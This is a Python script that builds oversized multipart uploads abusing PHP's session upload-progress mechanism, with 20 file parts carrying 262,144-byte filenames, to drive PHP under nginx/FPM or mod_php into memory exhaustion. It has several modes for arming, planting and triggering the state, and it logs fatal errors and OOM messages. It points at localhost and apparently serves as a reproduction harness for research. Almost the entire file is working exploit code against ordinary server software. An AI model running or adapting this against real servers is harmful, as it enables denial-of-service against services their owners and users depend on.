#!/usr/bin/env python3
"""http_arm.py - upload-progress OOM arm over HTTP (nginx -> FPM / mod_php).

Byte-identical stock body:
  field PHPSESSID, field PHP_SESSION_UPLOAD_PROGRESS=MMM,
  20 file parts, filename F*9 then F*262144, body 4,983,500 B.
The session id travels as Cookie PHPSESSID=<sid> (use_only_cookies=1) and as
the PHPSESSID form field (stock parity).

Modes: arm | big (--length/--parts) | consumer | plant | get | probe
Every request: raw body + parsed metadata saved under <outdir>/<tag>/.
"""
import argparse
import hashlib
import http.client
import json
import os
import re
import time

BOUNDARY = b"NATIVEOUTPUTEXACT"
FATAL_RE = re.compile(r"(?:<b>)?Fatal error(?:</b>)?[^\r\n]*")
OOM_RE = re.compile(r"Allowed memory size of (\d+) bytes exhausted(?: \(tried to allocate (\d+) bytes\))?")
WARN_RE = re.compile(r"Warning:[^\r\n<]*")


def field(name, value):
    return (b"--" + BOUNDARY + b"\r\n"
            + b'Content-Disposition: form-data; name="' + name + b'"\r\n\r\n'
            + value + b"\r\n")


def file_part(index, filename):
    return (b"--" + BOUNDARY + b"\r\n"
            + b'Content-Disposition: form-data; name="upload'
            + str(index).encode() + b'"; filename="' + filename + b'"\r\n'
            + b"Content-Type: application/octet-stream\r\n\r\nX\r\n")


def arm_body(sid, length=262144, parts=20):
    body = field(b"PHPSESSID", sid)
    body += field(b"PHP_SESSION_UPLOAD_PROGRESS", b"MMM")
    for i in range(parts):
        n = 9 if i == 0 else length
        body += file_part(i, b"F" * n)
    return body + b"--" + BOUNDARY + b"--\r\n"


def consumer_body():
    return (b"--" + BOUNDARY + b"\r\n"
            + b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"'
            b"\r\n\r\nMMM\r\n"
            b"--" + BOUNDARY + b"\r\n"
            + b'Content-Disposition: form-data; name="f"; filename="x"\r\n'
            b"Content-Type: application/octet-stream\r\n\r\nY\r\n"
            + b"--" + BOUNDARY + b"--\r\n")


def sha(b):
    return hashlib.sha256(b).hexdigest()


def post(port, path, sid, body, timeout):
    t0 = time.time()
    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=timeout)
    headers = {
        "Content-Type": "multipart/form-data; boundary=" + BOUNDARY.decode(),
        "Content-Length": str(len(body)),
        "Cookie": "PHPSESSID=" + sid,
        "Connection": "close",
    }
    try:
        conn.request("POST", path, body=body, headers=headers)
        resp = conn.getresponse()
        raw = resp.read()
        meta = {"http_status": resp.status, "headers": dict(resp.getheaders()),
                "body": raw}
    finally:
        conn.close()
    meta["duration_s"] = round(time.time() - t0, 3)
    return meta


def get(port, path, sid, timeout):
    t0 = time.time()
    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=timeout)
    headers = {"Cookie": "PHPSESSID=" + sid, "Connection": "close"}
    try:
        conn.request("GET", path, headers=headers)
        resp = conn.getresponse()
        raw = resp.read()
        meta = {"http_status": resp.status, "headers": dict(resp.getheaders()),
                "body": raw}
    finally:
        conn.close()
    meta["duration_s"] = round(time.time() - t0, 3)
    return meta


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--sid", required=True)
    ap.add_argument("--mode", choices=["arm", "big", "consumer", "plant", "get", "probe"],
                    default="arm")
    ap.add_argument("--length", type=int, default=262144)
    ap.add_argument("--parts", type=int, default=20)
    ap.add_argument("--outdir", required=True)
    ap.add_argument("--tag", default="req")
    ap.add_argument("--repeat", type=int, default=1)
    ap.add_argument("--timeout", type=float, default=300.0)
    a = ap.parse_args()

    os.makedirs(a.outdir, exist_ok=True)
    for i in range(a.repeat):
        tag = f"{a.tag}_{i + 1}" if a.repeat > 1 else a.tag
        if a.mode in ("arm", "big", "consumer"):
            body = (arm_body(a.sid.encode(), 262144, 20) if a.mode == "arm"
                    else arm_body(a.sid.encode(), a.length, a.parts) if a.mode == "big"
                    else consumer_body())
            res = post(a.port, a.path, a.sid, body, a.timeout)
        else:
            body = b""
            res = get(a.port, a.path, a.sid, a.timeout)

        raw = res["body"]
        text = raw.decode("latin-1", "replace")
        oom = OOM_RE.search(text)
        meta = {
            "tag": tag, "port": a.port, "path": a.path, "sid": a.sid,
            "mode": a.mode, "body_len": len(body), "body_sha256": sha(body),
            "http_status": res["http_status"], "headers": res["headers"],
            "duration_s": res["duration_s"],
            "resp_len": len(raw), "resp_sha256": sha(raw),
            "body_preview": raw[:600].decode("latin-1", "replace"),
            "fatal_lines": FATAL_RE.findall(text),
            "warning_lines": WARN_RE.findall(text),
            "oom": ({"limit": oom.group(1), "tried": oom.group(2)} if oom else None),
        }
        d = os.path.join(a.outdir, tag)
        os.makedirs(d, exist_ok=True)
        open(os.path.join(d, "request.bin"), "wb").write(body)
        open(os.path.join(d, "response.bin"), "wb").write(raw)
        open(os.path.join(d, "headers.txt"), "w").write(
            "\n".join(f"{k}: {v}" for k, v in res["headers"].items()) + "\n")
        json.dump(meta, open(os.path.join(d, "meta.json"), "w"), indent=1, sort_keys=True)
        with open(os.path.join(a.outdir, "results.jsonl"), "a") as f:
            f.write(json.dumps(meta, sort_keys=True) + "\n")
        print(json.dumps({k: meta[k] for k in
                          ("tag", "mode", "http_status", "resp_len", "resp_sha256",
                           "fatal_lines", "oom", "duration_s")}, sort_keys=True))


if __name__ == "__main__":
    main()
